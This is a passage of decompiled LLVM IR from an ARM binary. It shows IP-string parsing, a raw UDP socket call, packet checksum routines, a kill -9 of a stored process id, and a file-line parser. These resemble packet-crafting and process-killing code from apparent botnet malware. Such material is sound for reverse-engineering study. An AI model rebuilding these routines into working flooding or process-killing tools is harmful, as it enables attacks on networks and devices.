  %v0_ebec = phi i32 [ %v0_ebec16, %dec_label_pc_ebd4 ], [ 0, %dec_label_pc_eba8 ]
  %v0_ebf4 = phi i32 [ %v1_ebf4, %dec_label_pc_ebd4 ], [ %v2_ebb8, %dec_label_pc_eba8 ]
  %v1_ebe8 = inttoptr i32 %v0_ebf4 to i8*
  %v2_ebe8 = load i8, i8* %v1_ebe8, align 1
  %v3_ebe8 = zext i8 %v2_ebe8 to i32
  %v2_ebec = icmp eq i32 %v0_ebec, 0
  %v1_ebf4 = add i32 %v0_ebf4, 1
  %v1_ebf8 = add nsw i32 %v3_ebe8, -48
  br i1 %v2_ebec, label %dec_label_pc_ec00, label %dec_label_pc_ec10

dec_label_pc_ec00:                                ; preds = %dec_label_pc_ebe8
  %v7_ec00 = icmp eq i8 %v2_ebe8, 9
  br i1 %v7_ec00, label %dec_label_pc_ebd4, label %bb

bb:                                               ; preds = %dec_label_pc_ec00
  %v8_ec04 = icmp eq i8 %v2_ebe8, 32
  br i1 %v8_ec04, label %dec_label_pc_ebd4, label %dec_label_pc_ec0c

dec_label_pc_ec0c:                                ; preds = %bb
  %v1_ec0c = add i32 %v0_ec0c, 1
  br label %dec_label_pc_ec10

dec_label_pc_ec10:                                ; preds = %dec_label_pc_ebe8, %dec_label_pc_ec0c
  %v0_ec0c21 = phi i32 [ %v0_ec0c, %dec_label_pc_ebe8 ], [ %v1_ec0c, %dec_label_pc_ec0c ]
  %v0_ebec17 = phi i32 [ %v0_ebec, %dec_label_pc_ebe8 ], [ %v1_ec0c, %dec_label_pc_ec0c ]
  %v7_ec10 = icmp eq i8 %v2_ebe8, 46
  br i1 %v7_ec10, label %dec_label_pc_ebcc, label %bb75

bb75:                                             ; preds = %dec_label_pc_ec10
  %tmp = icmp ult i32 %v1_ebf8, 10
  br i1 %tmp, label %dec_label_pc_ebcc, label %dec_label_pc_ec1c

dec_label_pc_ec1c:                                ; preds = %dec_label_pc_ebcc, %bb75
  %v0_ebd8.lcssa = phi i32 [ %v1_ebf0, %dec_label_pc_ebcc ], [ %v0_ebd8, %bb75 ]
  %v2_ec20 = sub i32 %v0_ebd8.lcssa, %v0_eb98
  %v3_ec2c = call i32 @function_13a84(i32 %v2_ebc0, i32 %v2_ebb8, i32 %v2_ec20)
  %tmp76 = bitcast i32* %stack_var_-72 to i8*
  %v2_ec3c = load i32, i32* %r7.global-to-local, align 4
  %v3_ec3c = inttoptr i32 %v2_ec3c to i8*
  store i8 0, i8* %v3_ec3c, align 1
  %v3_ec40 = call i32 @inet_addr(i8* %tmp76)
  br label %dec_label_pc_ec48

dec_label_pc_ec4814:                              ; preds = %dec_label_pc_f108
  unreachable

dec_label_pc_ec48:                                ; preds = %dec_label_pc_f180, %dec_label_pc_f170, %dec_label_pc_f164, %dec_label_pc_f150, %dec_label_pc_ec1c
  %v29_f14c = phi i32 [ %v1_f10c, %dec_label_pc_f180 ], [ %v1_f10c, %dec_label_pc_f170 ], [ %v1_f10c, %dec_label_pc_f164 ], [ %v1_f10c, %dec_label_pc_f150 ], [ %v3_ec40, %dec_label_pc_ec1c ]
  %v2_ec4c = icmp eq i32 %v6_eb0c, 0
  br i1 %v2_ec4c, label %dec_label_pc_f144, label %dec_label_pc_ec54

dec_label_pc_ec54:                                ; preds = %dec_label_pc_ec48
  %v1_ec58 = inttoptr i32 %v6_eb0c to i8*
  %v2_ec58 = call i32 @function_13a08(i8* %v1_ec58)
  %v3_ec6c = call i32 @_socket(i32 2, i32 3, i32 17)
  unreachable

dec_label_pc_f108:                                ; preds = %dec_label_pc_ebd4, %dec_label_pc_eba0, %dec_label_pc_e9ec, %dec_label_pc_eb44
  %v0_f108 = call i32 @function_10bd8()
  %v1_f10c = urem i32 %v0_f108, 4
  %trunc = trunc i32 %v0_f108 to i2
  switch i2 %trunc, label %dec_label_pc_ec4814 [
    i2 0, label %dec_label_pc_f150
    i2 1, label %dec_label_pc_f164
    i2 -2, label %dec_label_pc_f170
    i2 -1, label %dec_label_pc_f180
  ]

dec_label_pc_f144:                                ; preds = %dec_label_pc_ec48
  store i32 %v12_e9ec, i32* %r7.global-to-local, align 4
  ret i32 %v29_f14c

dec_label_pc_f150:                                ; preds = %dec_label_pc_f108
  br label %dec_label_pc_ec48

dec_label_pc_f164:                                ; preds = %dec_label_pc_f108
  br label %dec_label_pc_ec48

dec_label_pc_f170:                                ; preds = %dec_label_pc_f108
  br label %dec_label_pc_ec48

dec_label_pc_f180:                                ; preds = %dec_label_pc_f108
  br label %dec_label_pc_ec48

; uselistorder directives
  uselistorder i32 %v0_f108, { 1, 0 }
  uselistorder i32 %v1_ec0c, { 1, 0 }
  uselistorder i8 %v2_ebe8, { 2, 0, 1, 3 }
  uselistorder i32 %v0_ebec, { 1, 0 }
  uselistorder i32 %v0_ec0c, { 3, 0, 2, 1 }
  uselistorder i32 %v0_ebd8, { 0, 2, 1 }
  uselistorder i32 %v2_ebc0, { 1, 0, 2 }
  uselistorder i32 %v0_eba0, { 1, 0, 2 }
  uselistorder i32 %v0_eb98, { 2, 3, 1, 4, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32 64, { 6, 0, 1, 7, 2, 3, 4, 5, 8 }
  uselistorder i32 (i32, i32*, i32, i32)* @function_b240, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 82, 83, 84, 85, 86, 87, 88, 89, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 90, 91 }
  uselistorder label %dec_label_pc_f108, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_ec1c, { 1, 0 }
  uselistorder label %dec_label_pc_ec10, { 1, 0 }
  uselistorder label %dec_label_pc_ebd4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ebcc, { 1, 0 }
}

define i32 @function_f19c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_f19c:
  %tmp = or i32 %arg1, 1
  %tmp9 = icmp eq i32 %tmp, 1
  br i1 %tmp9, label %dec_label_pc_f1cc, label %dec_label_pc_f1a8

dec_label_pc_f1a8:                                ; preds = %dec_label_pc_f19c
  %v0_f1ac.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_f1ac

dec_label_pc_f1ac:                                ; preds = %dec_label_pc_f1ac, %dec_label_pc_f1a8
  %v0_f1c0 = phi i32 [ %v2_f1c0, %dec_label_pc_f1ac ], [ 0, %dec_label_pc_f1a8 ]
  %v0_f1b4 = phi i32 [ %v1_f1b4, %dec_label_pc_f1ac ], [ %arg1, %dec_label_pc_f1a8 ]
  %v0_f1c4 = phi i32 [ %v1_f1c4, %dec_label_pc_f1ac ], [ %v0_f1ac.pre, %dec_label_pc_f1a8 ]
  %v1_f1ac = inttoptr i32 %v0_f1c4 to i8*
  %v2_f1ac = load i8, i8* %v1_f1ac, align 1
  %v3_f1ac = zext i8 %v2_f1ac to i32
  %v1_f1b0 = add i32 %v0_f1c4, 1
  %v2_f1b0 = inttoptr i32 %v1_f1b0 to i8*
  %v3_f1b0 = load i8, i8* %v2_f1b0, align 1
  %v4_f1b0 = zext i8 %v3_f1b0 to i32
  %v1_f1b4 = add i32 %v0_f1b4, -2
  %v4_f1b8 = mul nuw nsw i32 %v4_f1b0, 256
  %v5_f1b8 = or i32 %v4_f1b8, %v3_f1ac
  %v2_f1c0 = add i32 %v5_f1b8, %v0_f1c0
  %v1_f1c4 = add i32 %v0_f1c4, 2
  store i32 %v1_f1c4, i32* @r0, align 4
  %v1_f1b4.cmp = icmp ugt i32 %v1_f1b4, 1
  br i1 %v1_f1b4.cmp, label %dec_label_pc_f1ac, label %dec_label_pc_f1cc

dec_label_pc_f1cc:                                ; preds = %dec_label_pc_f1ac, %dec_label_pc_f19c
  %v1_f1d4 = phi i32 [ 0, %dec_label_pc_f19c ], [ %v2_f1c0, %dec_label_pc_f1ac ]
  %v0_f1cc = phi i32 [ %arg1, %dec_label_pc_f19c ], [ %v1_f1b4, %dec_label_pc_f1ac ]
  %v7_f1cc = icmp eq i32 %v0_f1cc, 1
  br i1 %v7_f1cc, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_f1cc
  %v1_f1d0 = load i32, i32* @r0, align 4
  %v2_f1d0 = inttoptr i32 %v1_f1d0 to i8*
  %v3_f1d0 = load i8, i8* %v2_f1d0, align 1
  %v4_f1d0 = zext i8 %v3_f1d0 to i32
  %v3_f1d4 = add i32 %v1_f1d4, %v4_f1d0
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_f1cc, %bb
  %v0_f1d8 = phi i32 [ %v1_f1d4, %dec_label_pc_f1cc ], [ %v3_f1d4, %bb ]
  %v3_f1dc = urem i32 %v0_f1d8, 65536
  %v4_f1e0 = udiv i32 %v0_f1d8, 65536
  %v5_f1e0 = add nuw nsw i32 %v4_f1e0, %v3_f1dc
  %v4_f1e4 = udiv i32 %v5_f1e0, 65536
  %v5_f1e4 = add nuw nsw i32 %v4_f1e4, %v5_f1e0
  %v1_f1e8 = urem i32 %v5_f1e4, 65536
  %v3_f1f0 = xor i32 %v1_f1e8, 65535
  ret i32 %v3_f1f0

; uselistorder directives
  uselistorder i32 %v5_f1e0, { 1, 0 }
  uselistorder i32 %v1_f1c4, { 1, 0 }
  uselistorder i32 %v1_f1b4, { 1, 0, 2 }
  uselistorder i32 %v0_f1c4, { 0, 2, 1 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_f1f8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_f1f8:
  %v3_f208 = urem i32 %arg2, 65536
  %v1_f20c = add i32 %arg1, 12
  %v1_f210 = inttoptr i32 %v1_f20c to i32*
  %v2_f210 = load i32, i32* %v1_f210, align 4
  %v3_f210 = add i32 %arg1, 16
  %v4_f210 = inttoptr i32 %v3_f210 to i32*
  %v5_f210 = load i32, i32* %v4_f210, align 4
  %v7_f214 = icmp sgt i32 %arg3, 1
  br i1 %v7_f214, label %dec_label_pc_f220.preheader, label %dec_label_pc_f240

dec_label_pc_f220.preheader:                      ; preds = %dec_label_pc_f1f8
  %v0_f220.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_f220

dec_label_pc_f220:                                ; preds = %dec_label_pc_f220.preheader, %dec_label_pc_f220
  %v0_f234 = phi i32 [ 0, %dec_label_pc_f220.preheader ], [ %v2_f234, %dec_label_pc_f220 ]
  %v0_f228 = phi i32 [ %arg3, %dec_label_pc_f220.preheader ], [ %v1_f228, %dec_label_pc_f220 ]
  %v0_f238 = phi i32 [ %v0_f220.pre, %dec_label_pc_f220.preheader ], [ %v1_f238, %dec_label_pc_f220 ]
  %v1_f220 = inttoptr i32 %v0_f238 to i8*
  %v2_f220 = load i8, i8* %v1_f220, align 1
  %v3_f220 = zext i8 %v2_f220 to i32
  %v1_f224 = add i32 %v0_f238, 1
  %v2_f224 = inttoptr i32 %v1_f224 to i8*
  %v3_f224 = load i8, i8* %v2_f224, align 1
  %v4_f224 = zext i8 %v3_f224 to i32
  %v1_f228 = add nsw i32 %v0_f228, -2
  %v4_f22c = mul nuw nsw i32 %v4_f224, 256
  %v5_f22c = or i32 %v4_f22c, %v3_f220
  %v2_f234 = add i32 %v5_f22c, %v0_f234
  %v1_f238 = add i32 %v0_f238, 2
  store i32 %v1_f238, i32* @r1, align 4
  %v8_f23c = icmp sgt i32 %v1_f228, 1
  br i1 %v8_f23c, label %dec_label_pc_f220, label %dec_label_pc_f240

dec_label_pc_f240:                                ; preds = %dec_label_pc_f220, %dec_label_pc_f1f8
  %v1_f248 = phi i32 [ 0, %dec_label_pc_f1f8 ], [ %v2_f234, %dec_label_pc_f220 ]
  %v0_f240 = phi i32 [ %arg3, %dec_label_pc_f1f8 ], [ %v1_f228, %dec_label_pc_f220 ]
  %v7_f240 = icmp eq i32 %v0_f240, 1
  br i1 %v7_f240, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_f240
  %v1_f244 = load i32, i32* @r1, align 4
  %v2_f244 = inttoptr i32 %v1_f244 to i8*
  %v3_f244 = load i8, i8* %v2_f244, align 1
  %v4_f244 = zext i8 %v3_f244 to i32
  %v3_f248 = add i32 %v4_f244, %v1_f248
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_f240, %bb
  %v0_f26c = phi i32 [ %v1_f248, %dec_label_pc_f240 ], [ %v3_f248, %bb ]
  %v3_f250 = urem i32 %v2_f210, 65536
  %v1_f258 = add i32 %arg1, 9
  %v2_f258 = inttoptr i32 %v1_f258 to i8*
  %v3_f258 = load i8, i8* %v2_f258, align 1
  %v4_f258 = zext i8 %v3_f258 to i32
  %v3_f25c = urem i32 %v5_f210, 65536
  %v4_f260 = udiv i32 %v2_f210, 65536
  %v3_f268 = mul nuw nsw i32 %v4_f258, 256
  %v4_f26c = udiv i32 %v5_f210, 65536
  %v5_f26c = add i32 %v0_f26c, %v4_f26c
  %v2_f270 = add i32 %v5_f26c, %v3_f268
  %v5_f260 = add nuw nsw i32 %v3_f250, %v3_f208
  %v2_f264 = add nuw nsw i32 %v5_f260, %v4_f260
  %v2_f274 = add nuw nsw i32 %v2_f264, %v3_f25c
  %v2_f278 = add i32 %v2_f270, %v2_f274
  %tmp = icmp ult i32 %v2_f278, 65536
  br i1 %tmp, label %dec_label_pc_f298, label %dec_label_pc_f284

dec_label_pc_f284:                                ; preds = %.thread, %dec_label_pc_f284
  %v2_f28c1 = phi i32 [ %v2_f28c, %dec_label_pc_f284 ], [ %v2_f278, %.thread ]
  %v3_f2902.in = phi i32 [ %v2_f28c, %dec_label_pc_f284 ], [ %v2_f278, %.thread ]
  %v3_f2902 = udiv i32 %v3_f2902.in, 65536
  %v3_f288 = urem i32 %v2_f28c1, 65536
  %v2_f28c = add nuw nsw i32 %v3_f288, %v3_f2902
  %tmp14 = icmp ult i32 %v2_f28c, 65536
  br i1 %tmp14, label %dec_label_pc_f298.loopexit, label %dec_label_pc_f284

dec_label_pc_f298.loopexit:                       ; preds = %dec_label_pc_f284
  br label %dec_label_pc_f298

dec_label_pc_f298:                                ; preds = %dec_label_pc_f298.loopexit, %.thread
  %v0_f298 = phi i32 [ %v2_f28c, %dec_label_pc_f298.loopexit ], [ %v2_f278, %.thread ]
  %v1_f298 = urem i32 %v0_f298, 65536
  %v3_f2a0 = xor i32 %v1_f298, 65535
  ret i32 %v3_f2a0

; uselistorder directives
  uselistorder i32 %v2_f28c, { 2, 1, 3, 0 }
  uselistorder i32 %v2_f278, { 3, 0, 2, 1 }
  uselistorder i32 %v1_f248, { 1, 0 }
  uselistorder i32 %v1_f238, { 1, 0 }
  uselistorder i32 %v1_f228, { 0, 2, 1 }
  uselistorder i32 %v0_f238, { 0, 2, 1 }
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f284, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_f220, { 1, 0 }
}

define i32 @function_f2a8(i32 %arg1) local_unnamed_addr {
dec_label_pc_f2a8:
  %v2_f2ac = load i32, i32* @global_var_1cdb0.152, align 4
  %v3_f2b4 = call i32 @kill(i32 %v2_f2ac, i32 9)
  %v0_f2b8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_f2b8, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_f2a8
  %v1_f2b8 = load i32, i32* @ip, align 4
  %v2_f2b8 = trunc i32 %v1_f2b8 to i16
  store i16 %v2_f2b8, i16* inttoptr (i32 9 to i16*), align 2
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_f2a8, %bb
  ret i32 %v3_f2b4

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_f2bc(i32 %arg1) local_unnamed_addr {
dec_label_pc_f2bc:
  %r4.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-68 = alloca i8, align 1
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-581 = alloca i8, align 1
  %stack_var_-8773 = alloca i32, align 4
  %stack_var_-4677 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_f2bc = load i32, i32* @r4, align 4
  store i32 %v3_f2bc, i32* %stack_var_-36, align 4
  %v6_f2bc = load i32, i32* @r5, align 4
  %v9_f2bc = load i32, i32* @r6, align 4
  %v12_f2bc = load i32, i32* @r7, align 4
  %v15_f2bc = load i32, i32* @r8, align 4
  %v21_f2bc = load i32, i32* @sl, align 4
  %v2_f2d0 = ptrtoint i32* %stack_var_-4677 to i32
  store i32 %v2_f2d0, i32* @sl, align 4
  %v3_f2d8 = mul i32 %arg1, 65536
  store i32 %v3_f2d8, i32* @r5, align 4
  %v2_f2e4 = ptrtoint i32* %stack_var_-8773 to i32
  %v4_f2f0 = call i32* @memset(i32* nonnull %stack_var_-4677, i32 0, i32 4096)
  %v0_f304 = load i32, i32* @r5, align 4
  %v3_f304 = udiv i32 %v0_f304, 65536
  store i32 %v3_f304, i32* %r4.global-to-local, align 4
  %v4_f308 = call i32* @memset(i32* nonnull %stack_var_-8773, i32 0, i32 4096)
  %v2_f30c = ptrtoint i8* %stack_var_-581 to i32
  store i32 %v2_f30c, i32* @r6, align 4
  %v1_f314 = mul nuw nsw i32 %v3_f304, 256
  %v3_f320 = and i32 %v1_f314, 65280
  store i32 %v3_f320, i32* %r4.global-to-local, align 4
  %v2_f328 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_f328, i32* %sb.global-to-local, align 4
  %v3_f32c = bitcast i8* %stack_var_-581 to i32*
  %v4_f32c = call i32* @memset(i32* %v3_f32c, i32 0, i32 513)
  %v2_f330 = ptrtoint i8* %stack_var_-68 to i32
  store i32 %v2_f330, i32* %sb.global-to-local, align 4
  %v0_f338 = load i32, i32* %r4.global-to-local, align 4
  %v1_f338 = load i32, i32* @r5, align 4
  %v4_f338 = udiv i32 %v1_f338, 16777216
  %v5_f338 = or i32 %v4_f338, %v0_f338
  store i32 0, i32* @r4, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v3_f358 = trunc i32 %v5_f338 to i8
  %v4_f358 = call i32 @function_13efc(i8 %v3_f358, i32 16, i32 %v2_f330)
  %v2_f360 = call i32 @function_13a08(i8* nonnull %stack_var_-68)
  %v7_f364 = icmp eq i32 %v2_f360, 2
  br i1 %v7_f364, label %dec_label_pc_f7f8, label %dec_label_pc_f36c

dec_label_pc_f36c:                                ; preds = %dec_label_pc_f2bc, %dec_label_pc_f7f8
  %v1_f370 = call i32 @function_130e4(i32 6)
  %v1_f378 = call i32 @function_130e4(i32 7)
  %v1_f380 = call i32 @function_130e4(i32 9)
  %v0_f388 = load i32, i32* @r4, align 4
  %v4_f38c = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_143ac.154, i32 0, i32 0), i32 %v0_f388)
  %v7_f390 = icmp eq i32 %v4_f38c, -1
  store i32 %v4_f38c, i32* @r8, align 4
  br i1 %v7_f390, label %dec_label_pc_f7b8, label %dec_label_pc_f39c.preheader

dec_label_pc_f39c.preheader:                      ; preds = %dec_label_pc_f36c
  %v4_f3a856 = call i32 @function_13c60(i32* %v3_f32c, i32 512, i32 %v4_f38c)
  %v2_f3ac58 = icmp eq i32 %v4_f3a856, 0
  br i1 %v2_f3ac58, label %dec_label_pc_f53c.loopexit, label %dec_label_pc_f3b4.lr.ph

dec_label_pc_f3b4.lr.ph:                          ; preds = %dec_label_pc_f39c.preheader
  %v2_f3fc = ptrtoint i32* %stack_var_-36 to i32
  br label %dec_label_pc_f3b4

dec_label_pc_f3b4:                                ; preds = %dec_label_pc_f3b4.lr.ph, %dec_label_pc_f39c.backedge
  %v3_f3b8 = load i8, i8* %stack_var_-581, align 1
  %v4_f3b8 = sext i8 %v3_f3b8 to i32
  %v2_f3bc = icmp eq i8 %v3_f3b8, 0
  br i1 %v2_f3bc, label %bb128, label %bb

bb:                                               ; preds = %dec_label_pc_f3b4
  %v8_f3c0 = icmp eq i8 %v3_f3b8, 58
  br i1 %v8_f3c0, label %.thread6, label %dec_label_pc_f3d4

.thread6:                                         ; preds = %bb
  br label %dec_label_pc_f3ec

bb128:                                            ; preds = %dec_label_pc_f3b4
  br label %dec_label_pc_f3ec

dec_label_pc_f3d4:                                ; preds = %bb
  %v1_f3dc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_f3d8

dec_label_pc_f3d8:                                ; preds = %bb129, %dec_label_pc_f3d4
  %v0_f3d8 = phi i32 [ %v1_f3d8, %bb129 ], [ 0, %dec_label_pc_f3d4 ]
  %v1_f3d8 = add i32 %v0_f3d8, 1
  %v2_f3dc = add i32 %v1_f3d8, %v1_f3dc.pre
  %v3_f3dc = inttoptr i32 %v2_f3dc to i8*
  %v4_f3dc = load i8, i8* %v3_f3dc, align 1
  %v6_f3dc = zext i8 %v4_f3dc to i32
  %v2_f3e0 = icmp eq i8 %v4_f3dc, 0
  br i1 %v2_f3e0, label %dec_label_pc_f3ec, label %bb129

bb129:                                            ; preds = %dec_label_pc_f3d8
  %v8_f3e4 = icmp eq i8 %v4_f3dc, 58
  br i1 %v8_f3e4, label %dec_label_pc_f3ec, label %dec_label_pc_f3d8

dec_label_pc_f3ec:                                ; preds = %dec_label_pc_f3d8, %bb129, %bb128, %.thread6
  %v1_f418 = phi i32 [ 0, %.thread6 ], [ 0, %bb128 ], [ %v1_f3d8, %bb129 ], [ %v1_f3d8, %dec_label_pc_f3d8 ]
  %v0_f3ec = phi i32 [ %v4_f3b8, %.thread6 ], [ %v4_f3b8, %bb128 ], [ %v6_f3dc, %bb129 ], [ %v6_f3dc, %dec_label_pc_f3d8 ]
  %v2_f3ec = icmp eq i32 %v0_f3ec, 0
  br i1 %v2_f3ec, label %dec_label_pc_f39c.backedge, label %dec_label_pc_f3f4

dec_label_pc_f39c.backedge:                       ; preds = %dec_label_pc_f3ec, %dec_label_pc_f4c4, %dec_label_pc_f510, %dec_label_pc_f438
  %v0_f3a4 = load i32, i32* @r8, align 4
  %v4_f3a8 = call i32 @function_13c60(i32* %v3_f32c, i32 512, i32 %v0_f3a4)
  %v2_f3ac = icmp eq i32 %v4_f3a8, 0
  br i1 %v2_f3ac, label %dec_label_pc_f53c.loopexit, label %dec_label_pc_f3b4

dec_label_pc_f3f4:                                ; preds = %dec_label_pc_f3ec
  %v1_f3f8 = add i32 %v1_f418, 2
  %v2_f400 = add i32 %v1_f3f8, %v2_f3fc
  %v1_f404 = add i32 %v2_f400, -545
  %v2_f404 = inttoptr i32 %v1_f404 to i8*
  %v3_f404 = load i8, i8* %v2_f404, align 1
  %v2_f408 = icmp eq i8 %v3_f404, 0
  br i1 %v2_f408, label %bb131, label %bb130

bb130:                                            ; preds = %dec_label_pc_f3f4
  %v8_f40c = icmp eq i8 %v3_f404, 32
  br i1 %v8_f40c, label %.thread10, label %dec_label_pc_f418

.thread10:                                        ; preds = %bb130
  store i32 %v1_f3f8, i32* @r5, align 4
  br label %dec_label_pc_f438

bb131:                                            ; preds = %dec_label_pc_f3f4
  store i32 %v1_f3f8, i32* @r5, align 4
  br label %dec_label_pc_f438

dec_label_pc_f418:                                ; preds = %bb130
  %v0_f418 = load i32, i32* @r6, align 4
  %v2_f418 = add i32 %v0_f418, %v1_f418
  br label %dec_label_pc_f41c

dec_label_pc_f41c:                                ; preds = %bb132, %dec_label_pc_f418
  %v0_f42813 = phi i32 [ %v1_f428, %bb132 ], [ %v2_f418, %dec_label_pc_f418 ]
  %v1_f41c = add i32 %v0_f42813, 3
  %v2_f41c = inttoptr i32 %v1_f41c to i8*
  %v3_f41c = load i8, i8* %v2_f41c, align 1
  %v2_f420 = icmp eq i8 %v3_f41c, 0
  br i1 %v2_f420, label %.thread12, label %bb132

.thread12:                                        ; preds = %dec_label_pc_f41c
  %v1_f42814 = add i32 %v0_f42813, 1
  br label %dec_label_pc_f430

bb132:                                            ; preds = %dec_label_pc_f41c
  %v8_f424 = icmp eq i8 %v3_f41c, 32
  %v1_f428 = add i32 %v0_f42813, 1
  br i1 %v8_f424, label %dec_label_pc_f430, label %dec_label_pc_f41c

dec_label_pc_f430:                                ; preds = %bb132, %.thread12
  %v1_f42815 = phi i32 [ %v1_f42814, %.thread12 ], [ %v1_f428, %bb132 ]
  %v2_f430 = sub i32 %v1_f42815, %v0_f418
  %v1_f434 = add i32 %v2_f430, 2
  store i32 %v1_f434, i32* @r5, align 4
  br label %dec_label_pc_f438

dec_label_pc_f438:                                ; preds = %bb131, %.thread10, %dec_label_pc_f430
  %v1_f444 = phi i32 [ %v1_f3f8, %.thread10 ], [ %v1_f3f8, %bb131 ], [ %v1_f434, %dec_label_pc_f430 ]
  %v0_f438 = load i32, i32* @r6, align 4
  %v2_f438 = add i32 %v0_f438, %v1_f3f8
  store i32 %v2_f438, i32* @r4, align 4
  %v2_f444 = add i32 %v1_f444, %v2_f3fc
  store i32 0, i32* @r7, align 4
  %v3_f450 = add i32 %v2_f444, -545
  %v4_f450 = inttoptr i32 %v3_f450 to i8*
  store i8 0, i8* %v4_f450, align 1
  %v1_f454 = inttoptr i32 %v2_f438 to i8*
  %v2_f454 = call i32 @function_13a08(i8* %v1_f454)
  store i32 %v2_f454, i32* @r1, align 4
  %v0_f460 = load i32, i32* @r4, align 4
  %v3_f464 = inttoptr i32 %v0_f460 to i8*
  %v4_f464 = call i32 @function_13d5c(i8* %v3_f464, i32 %v2_f454, i32 %v2_f330)
  %v7_f468 = icmp eq i32 %v4_f464, -1
  br i1 %v7_f468, label %dec_label_pc_f39c.backedge, label %dec_label_pc_f484.preheader

dec_label_pc_f484.preheader:                      ; preds = %dec_label_pc_f438
  %v1_f46c = load i32, i32* @r7, align 4
  %v1_f470 = load i32, i32* @r6, align 4
  %v2_f470 = load i32, i32* @r5, align 4
  %v3_f470 = add i32 %v2_f470, %v1_f470
  store i32 %v1_f46c, i32* @r4, align 4
  %v1_f48448 = add i32 %v3_f470, 2
  %v2_f48449 = inttoptr i32 %v1_f48448 to i8*
  %v3_f48450 = load i8, i8* %v2_f48449, align 1
  %v2_f48852 = icmp eq i8 %v3_f48450, 0
  %v1_f48c54 = add i32 %v2_f470, 2
  br i1 %v2_f48852, label %dec_label_pc_f4c4, label %dec_label_pc_f494

dec_label_pc_f494:                                ; preds = %dec_label_pc_f484.preheader, %dec_label_pc_f484.backedge
  %v0_f4c484 = phi i32 [ %v0_f4c483, %dec_label_pc_f484.backedge ], [ %v1_f46c, %dec_label_pc_f484.preheader ]
  %v0_f4ac.pr = phi i32 [ %v0_f4ac.pr69, %dec_label_pc_f484.backedge ], [ %v1_f46c, %dec_label_pc_f484.preheader ]
  %v0_f7c8 = phi i32 [ %v0_f7c872, %dec_label_pc_f484.backedge ], [ %v1_f46c, %dec_label_pc_f484.preheader ]
  %v0_f48c80 = phi i32 [ %v1_f48c, %dec_label_pc_f484.backedge ], [ %v1_f48c54, %dec_label_pc_f484.preheader ]
  %v0_f4bc = phi i32 [ %v0_f484, %dec_label_pc_f484.backedge ], [ %v3_f470, %dec_label_pc_f484.preheader ]
  %v1_f498.in = phi i8 [ %v3_f484, %dec_label_pc_f484.backedge ], [ %v3_f48450, %dec_label_pc_f484.preheader ]
  %v7_f494 = icmp eq i8 %v1_f498.in, 9
  br i1 %v7_f494, label %.thread23, label %bb133

bb133:                                            ; preds = %dec_label_pc_f494
  %v8_f498 = icmp eq i8 %v1_f498.in, 32
  br i1 %v8_f498, label %.thread23.thread35, label %dec_label_pc_f4ac

.thread23.thread35:                               ; preds = %bb133
  br label %dec_label_pc_f4b8

.thread23:                                        ; preds = %dec_label_pc_f494
  br label %dec_label_pc_f4b8

dec_label_pc_f4ac:                                ; preds = %bb133
  %v7_f4ac = icmp eq i32 %v0_f4ac.pr, 1
  br i1 %v7_f4ac, label %dec_label_pc_f7c8, label %dec_label_pc_f4b4

dec_label_pc_f4b4:                                ; preds = %dec_label_pc_f7c8, %dec_label_pc_f4ac
  %v0_f4b877 = phi i32 [ %v1_f7c8, %dec_label_pc_f7c8 ], [ %v0_f7c8, %dec_label_pc_f4ac ]
  br label %dec_label_pc_f4b8

dec_label_pc_f4b8:                                ; preds = %.thread23, %.thread23.thread35, %dec_label_pc_f4b4
  %v0_f4b8 = phi i32 [ %v0_f7c8, %.thread23.thread35 ], [ %v0_f7c8, %.thread23 ], [ %v0_f4b877, %dec_label_pc_f4b4 ]
  %v0_f4ac.pr70 = phi i32 [ 1, %.thread23.thread35 ], [ 1, %.thread23 ], [ 0, %dec_label_pc_f4b4 ]
  %v7_f4c0 = icmp sgt i32 %v0_f4b8, 6
  br i1 %v7_f4c0, label %dec_label_pc_f4c4, label %dec_label_pc_f484.backedge

dec_label_pc_f4c4:                                ; preds = %dec_label_pc_f484.backedge, %dec_label_pc_f4b8, %dec_label_pc_f484.preheader
  %v1_f514 = phi i32 [ %v1_f48c54, %dec_label_pc_f484.preheader ], [ %v1_f48c, %dec_label_pc_f484.backedge ], [ %v0_f48c80, %dec_label_pc_f4b8 ]
  %v0_f4c4 = phi i32 [ %v1_f46c, %dec_label_pc_f484.preheader ], [ %v0_f4c483, %dec_label_pc_f484.backedge ], [ %v0_f4c484, %dec_label_pc_f4b8 ]
